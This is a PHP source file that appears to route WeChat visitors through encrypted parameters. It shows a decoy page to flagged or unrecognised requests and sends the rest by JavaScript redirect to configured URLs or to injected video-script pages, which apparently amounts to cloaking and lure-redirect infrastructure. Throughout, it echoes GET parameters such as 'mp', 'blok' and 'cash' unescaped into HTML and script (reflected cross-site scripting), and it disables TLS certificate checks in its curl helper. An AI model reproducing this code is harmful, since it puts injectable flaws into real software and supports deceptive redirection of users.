<?php
// exit('xzzczxczx');
include_once 'pp.php';
// var_dump($_SERVER['HTTP_USER_AGENT']);exit;
// $spsp=array_key_exists('spsp'.$i, $getdata);

if (isset($_GET['oridata'])){
    $tem = $des->authcode($_GET['oridata'], 'DECODE', $key);
    parse_str($tem, $getdata);
    if($getdata['act']=='qcsj'||$getdata['act']=='wlcz'){
        if ($iswx && array_key_exists('tip', $getdata)) {
            if ('ok' === $getdata['tip']){
               echo "<script type='text/javascript'>location.href='{$data['sp_url']}" . $des->authcode('tip='.$getdata['tip'].'&act=swty&vsd='.$_GET['vsd'].'&tip=' . $tem, '', $key, 60) . "'</script>";
            }else if('goon' ===  $getdata['tip']){
               echo "<script type='text/javascript'>location.href='{$data['sp_sjluo']}" . $des->authcode('tip='.$getdata['tip'].'&act=swty&vsd='.$_GET['vsd'].'&tip=' . $tem, '', $key, 60) . "'</script>";
            }else{
                wzss();
                echo "<script type='text/javascript'>location.href='{$data['sp_sjluo']}" . $des->authcode('tip=start&act=swty&vsd='.$_GET['vsd'].'&tip=' . $tem, '', $key, 60) . "'</script>";
            }
        }elseif ($iswx && array_key_exists('is', $getdata)){
            if ('cash' == $getdata['act']) {
                # code...
                wzss();
                echo "<script type='text/javascript'>location.href='{$data['sp_url']}{$data['sp_prif']}?cash={$_GET['cash']}'</script>";
            } else {
                wzss();
                $data['sp_prif']=$des->authcode('is=1&act=swty&vsd='.$getdata['vsd'].'&tip=start', '', $key, 60);
                echo "<script type='text/javascript'>location.href='{$data['sp_sjluo']}{$data['sp_prif']}'</script>";
            }
            exit;
        }
        exit;
    }elseif ($getdata['act']=='flth'){
        if (!isset($_GET['from'])) {
            # code...
            echo $page;
            exit;
        }
        include_once 'api.php';
        exit;
    }elseif ($getdata['act']=='swty'){
//         if ( strpos($_SERVER['HTTP_USER_AGENT'], 'WindowsWechat') == true || true == stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
//             # code...
//             echo $page;
//             exit;
//         }

        include_once 'down.php';
        exit;
    }else{
        echo $page;
        exit;
    }
}
if (empty($data['sp_url']) || empty($data['gg_url'])) {
    # code...
    $data['sp_url'] = "http://news.sogou.com/";
    $data['gg_url'] = "http://news.sogou.com/";
    $data['sp_jump'] = "http://news.sogou.com/";
}
// $jump = "http://pmm.people.com.cn/c?d=people&i=z1862,803482,12609&u=";
$isshare = array_key_exists('is', $_GET);

if ($black) {
    # code...
    echo $page;
    exit;
}elseif (array_key_exists('mp', $_GET)) {
    # code...
    echo $_GET['mp'];
} elseif (array_key_exists('blok', $_GET)||array_key_exists('tui8', $_GET)) {
//     if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == false || true == stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
//         # code...
//         echo $page;
//         exit;
//     }
    //定义获取duapp.php视频列表数据变量
    $_POST['getLIstvido']=true;
    $video=include_once 'duapp.php';//获取数据
    //判断是否获取到数据
    if ($video){
        $videoJsonstr=json_encode($video);
    }else{
        $videoJsonstr="''";
    }
    
    //$vsd 表示  显示那个视频的vsd
    if(!isset($vsd)){
        $vsd=0;
    }
    echo "<script type='text/javascript'>var tip = '{$_GET['blok']}';var videostr=$videoJsonstr;var vsd=$vsd; </script><script src='aliyun.js?t=" . time() . "' charset='utf-8'></script>";
    exit;


}elseif (array_key_exists('blok2', $_GET)) {
//     if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == false || true == stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
//         # code...
//         echo $page;
//         exit;
//     }
    //定义获取duapp.php视频列表数据变量
    $_POST['getLIstvido']=true;
    $video=include_once 'duapp.php';//获取数据
    //判断是否获取到数据
    if ($video){
        $videoJsonstr=json_encode($video);
    }else{
        $videoJsonstr="''";
    }
    
    //$vsd 表示  显示那个视频的vsd
    if(!isset($vsd)){
        $vsd=2;
    }
    echo "<script type='text/javascript'>var tip = '{$_GET['blok2']}';var videostr=$videoJsonstr;var vsd=$vsd; </script><script src='aliyun.js?t=" . time() . "' charset='utf-8'></script>";
    exit;


}elseif (array_key_exists('blok3', $_GET)) {
//     if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == false || true == stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
//         # code...
//         echo $page;
//         exit;
//     }
    //定义获取duapp.php视频列表数据变量
    $_POST['getLIstvido']=true;
    $video=include_once 'duapp.php';//获取数据
    //判断是否获取到数据
    if ($video){
        $videoJsonstr=json_encode($video);
    }else{
        $videoJsonstr="''";
    }
    
    //$vsd 表示  显示那个视频的vsd
    if(!isset($vsd)){
        $vsd=3;
    }
    echo "<script type='text/javascript'>var tip = '{$_GET['blok3']}';var videostr=$videoJsonstr;var vsd=$vsd; </script><script src='aliyun.js?t=" . time() . "' charset='utf-8'></script>";
    exit;


}elseif (array_key_exists('spok', $_GET)) {//var_dump(strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger'));exit;

//     if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') == false || true == stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
//         # code...
//         echo $page;
//         exit;
//     }
    //定义获取duapp.php视频列表数据变量
    $_POST['getLIstvido']=true;
    $video=include_once 'duapp.php';//获取数据
    //判断是否获取到数据
    if ($video){
        $videoJsonstr=json_encode($video);
    }else{
        $videoJsonstr="''";
    }
    //$vmd 表示  显示那个视频的vsd

    if(!isset($vsd)){
        $vsd=0;
    }
//     exit("zzz");

    echo "<script type='text/javascript'>var tip = 'ok';var videostr=$videoJsonstr;var vsd=$vsd; </script><script src='aliyun.js?t=" . time() . "' charset='utf-8'></script>";
    exit;
}elseif (array_key_exists('tuiguang', $_GET)) {
    # code...
    header('Content-Type: application/json');
    $temp['sp_url'] = $data['sp_url'] . $data['sp_prif'];
    ob_clean();
    echo json_encode($temp);
} elseif (array_key_exists('index', $_POST)) {
    # code...
    header('Content-Type: application/json');
    if ('ok' === $_POST['index']) {
        # code...
        $temp['url'] = $data['sp_jump'] . $des->authcode('act=qcsj&tip=ok', '', $key, 50) . "?vsd=".$_POST['vsd']."&status=ok";
        // echo $des->authcode('act=qcsj&status=ok', '', $key, 5000);
        file_put_contents('log.log', $temp['url']);
        // exit;
    } elseif ('goon' === $_POST['index']) {
        # code...
        #
        $temp['url'] = $data['sp_jump'] . $des->authcode('act=qcsj&tip=goon', '', $key, 5) . "?vsd=".$_POST['vsd']."&status=goon";

    } elseif ('xxp' === $_POST['index']) {
        # code...
        $temp['url'] = $data['sp_jump'] . $des->authcode('act=qcsj&tip=isshare', '', $key, 5) . "?isshare=0";
    }
    ob_clean();
    echo json_encode($temp);
} elseif (array_key_exists('cash', $_GET)) {
    wzss();
    # code...
    echo "<script type='text/javascript'>location.href='{$data['gg_url']}?cash={$_GET['cash']}'</script>";
} else {
    # code...
    echo $page;
    exit;
}

function wzss(){

    global $wz;
    $keyeee=array_rand($wz,1);

    echo file_get_contents($wz[$keyeee]);
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function getHost($url)
{
    $host = api('http://' . $url . '?tuiguang=true');
    if (empty($host)) {
        # code...
        return false;
    } elseif (!empty($host['sp_url'])) {
        # code...
        return $host['sp_url'];
    } else {
        # code...
        return false;
    }
}

function api($url)
{

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($curl, CURLOPT_MAXREDIRS, 1);
    $res = curl_exec($curl);
    curl_close($curl);

    return json_decode($res, true);
}
/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function setHost()
{
    $subhost = explode('.', $_SERVER["HTTP_HOST"]);
    $len     = count($subhost);
    if (false !== stripos('gov.', $_SERVER["HTTP_HOST"])) {
        # code...
        return $_SERVER["HTTP_HOST"];
    } elseif (false !== stripos('com.cn', $_SERVER["HTTP_HOST"])) {
        # code...
        return $subhost[$len - 3] . '.' . $subhost[$len - 2] . '.' . $subhost[$len - 1];
    }
    return $subhost[$len - 2] . '.' . $subhost[$len - 1];
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function getOrigin()
{
    $origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';
    if (empty($origin)) {
        # code...
        return false;
    }
    $subhost = explode('.', $origin);
    $len     = count($subhost);
    return $subhost[$len - 2] . '.' . $subhost[$len - 1];
}
